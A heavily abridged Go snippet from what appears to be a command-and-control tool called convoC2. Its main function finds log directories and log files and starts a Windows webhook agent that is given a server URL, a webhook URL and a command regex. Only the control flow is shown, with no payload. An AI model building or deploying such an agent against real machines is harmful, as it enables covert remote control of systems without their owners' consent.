...
import (
	...
	"github.com/p3r531d0n/convoC2/pkg/findAgent"
	"github.com/p3r531d0n/convoC2/pkg/windowsWebHookAgent"
)
...
func main() {
	...
	if findLogfiles {
		...
		var err error
		if usingMac {
			logDir, err = findAgent.MacFindLogDir()
		} else {
			logDir, err = findAgent.FindLogDir()
		}
		if err != nil {
		...
		logFiles, err := findAgent.FindLogFiles(logDir)
		if err != nil {
	...
	err := windowsWebHookAgent.Start(verbose, serverURL, timeout, webhookURL, regexp.MustCompile(commandRegex))
	if err != nil {
